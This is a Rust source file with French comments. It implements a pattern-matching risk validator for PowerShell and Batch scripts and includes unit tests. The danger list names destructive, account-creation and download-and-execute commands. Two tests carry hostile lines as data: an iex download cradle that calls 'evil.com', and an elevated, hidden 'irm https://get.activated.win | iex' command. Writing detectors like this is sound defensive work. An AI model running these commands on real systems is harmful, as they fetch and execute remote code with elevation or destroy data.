use serde::Serialize;

#[derive(Debug, Clone, Serialize)]
pub struct ValidationResult {
    pub risk_level: String, // "safe" | "warning" | "danger"
    pub warnings: Vec<String>,
    pub info: Vec<String>,
    pub line_count: usize,
}

/// Analyse un script PowerShell ou Batch et retourne un rapport de risque
#[tauri::command]
pub fn validate_script(code: String, language: String) -> ValidationResult {
    let mut warnings: Vec<String> = Vec::new();
    let mut info: Vec<String> = Vec::new();
    let lines: Vec<&str> = code.lines().collect();
    let lower = code.to_lowercase();

    // Patterns dangereux communs
    let danger_patterns: &[(&str, &str)] = &[
        ("format-volume", "Formatage de volume détecté"),
        ("remove-item -recurse", "Suppression récursive détectée"),
        ("rd /s /q c:", "Suppression récursive de C: détectée"),
        ("del /f /q", "Suppression forcée détectée"),
        ("net user /add", "Création de compte utilisateur détectée"),
        ("net localgroup administrators", "Modification groupe Admins détectée"),
        ("bcdedit", "Modification boot loader détectée"),
        ("reg add hklm\\sam", "Modification SAM registry détectée"),
        ("invoke-expression", "Exécution dynamique (IEX) détectée"),
        ("iex (", "Exécution dynamique (IEX) détectée"),
        ("downloadstring", "Téléchargement + exécution détecté"),
        ("downloadfile", "Téléchargement de fichier détecté"),
        ("-encodedcommand", "Commande encodée Base64 détectée"),
        // Shorts pour -EncodedCommand : bypassent facilement le filtre
        (" -enc ", "Commande encodée Base64 (court) détectée"),
        (" -e ", "Paramètre encodé suspect détecté"),
        ("disable-windowsoptionalfeature", "Désactivation de fonctionnalité Windows"),
        ("set-executionpolicy unrestricted", "Politique exécution permissive"),
        // Téléchargement depuis internet — promu de warning à danger
        ("invoke-webrequest", "Téléchargement depuis internet (Invoke-WebRequest)"),
        ("iwr ", "Téléchargement depuis internet (iwr)"),
        // Lancement de processus externe — danger si script utilisateur
        ("start-process", "Lancement de processus externe (Start-Process)"),
    ];

    let warning_patterns: &[(&str, &str)] = &[
        ("stop-service", "Arrêt de service"),
        ("disable-netadapter", "Désactivation d'adaptateur réseau"),
        ("clear-eventlog", "Effacement des journaux d'événements"),
        ("curl ", "Téléchargement depuis internet"),
        ("wget ", "Téléchargement depuis internet"),
        ("regedit", "Modification du registre"),
        ("taskkill", "Terminaison de processus"),
        ("sc config", "Modification de configuration service"),
        ("netsh", "Modification configuration réseau"),
        ("wmic", "Requête WMI système"),
        ("powershell -w hidden", "Exécution cachée PowerShell"),
        ("-windowstyle hidden", "Fenêtre cachée"),
    ];

    let mut is_danger = false;
    for (pattern, msg) in danger_patterns {
        if lower.contains(pattern) {
            warnings.push(format!("DANGER: {}", msg));
            is_danger = true;
        }
    }
    for (pattern, msg) in warning_patterns {
        if lower.contains(pattern) {
            warnings.push(format!("Attention: {}", msg));
        }
    }

    // Info générales
    if language.to_lowercase().contains("powershell") || language.to_lowercase().contains("ps1") {
        let has_error_handling = lower.contains("try {") || lower.contains("trap {") || lower.contains("-erroraction");
        if has_error_handling { info.push("Gestion d'erreur présente".to_string()); }

        let uses_sudo = lower.contains("[security.principal.") || lower.contains("runas");
        if uses_sudo { info.push("Demande d'élévation détectée".to_string()); }
    }

    let risk_level = if is_danger {
        "danger"
    } else if !warnings.is_empty() {
        "warning"
    } else {
        "safe"
    };

    ValidationResult {
        risk_level: risk_level.to_string(),
        warnings,
        info,
        line_count: lines.len(),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn safe_script_returns_safe() {
        let r = validate_script("Get-Process | Select-Object Name, CPU".into(), "powershell".into());
        assert_eq!(r.risk_level, "safe");
        assert!(r.warnings.is_empty());
    }

    #[test]
    fn danger_pattern_detected() {
        let r = validate_script("Invoke-Expression $code".into(), "powershell".into());
        assert_eq!(r.risk_level, "danger");
        assert!(r.warnings.iter().any(|w| w.contains("DANGER")));
    }

    #[test]
    fn download_string_is_danger() {
        let r = validate_script("iex (New-Object Net.WebClient).downloadstring('http://evil.com/x.ps1')".into(), "ps1".into());
        assert_eq!(r.risk_level, "danger");
    }

    #[test]
    fn encoded_command_is_danger() {
        let r = validate_script("powershell -EncodedCommand aGVsbG8=".into(), "batch".into());
        assert_eq!(r.risk_level, "danger");
    }

    #[test]
    fn stop_service_is_warning_not_danger() {
        let r = validate_script("Stop-Service -Name spooler".into(), "powershell".into());
        assert_eq!(r.risk_level, "warning");
        assert!(r.warnings.iter().any(|w| w.starts_with("Attention:")));
    }

    #[test]
    fn line_count_matches() {
        let script = "line1\nline2\nline3";
        let r = validate_script(script.into(), "powershell".into());
        assert_eq!(r.line_count, 3);
    }

    #[test]
    fn error_handling_detected_as_info() {
        let r = validate_script("try { Get-Service } catch { }".into(), "powershell".into());
        assert!(r.info.iter().any(|i| i.contains("Gestion d'erreur")));
    }

    #[test]
    fn irm_iex_elevated_pattern_is_danger() {
        // Régression : DiagTabActivation.vue::openMas() construisait cette
        // exacte commande (irm https://get.activated.win | iex, élevée via
        // Start-Process -Verb RunAs) et l'envoyait à execute_script — retiré
        // au profit d'open_mas_window() (n'exécute aucun script tiers).
        // `| iex` sans parenthèse ne matche PAS le pattern "iex (" existant,
        // mais est quand même intercepté via "start-process" (Start-Process
        // -Verb RunAs pour l'élévation) : ce test fige cette double dépendance
        // et détecterait une régression si le pattern "start-process" était
        // un jour retiré/assoupli sans que quelqu'un pense à cet appelant.
        let cmd = r#"powershell -WindowStyle Hidden -Command "Start-Process powershell -Verb RunAs -ArgumentList '-NoProfile -WindowStyle Normal -Command irm https://get.activated.win | iex'""#;
        let r = validate_script(cmd.into(), "cmd".into());
        assert_eq!(r.risk_level, "danger");
        // Confirme que c'est bien "start-process" qui déclenche le blocage
        // (le pattern "iex (" avec parenthèse ne matche pas "| iex" en pipeline).
        assert!(r.warnings.iter().any(|w| w.contains("Lancement de processus externe")));
    }
}
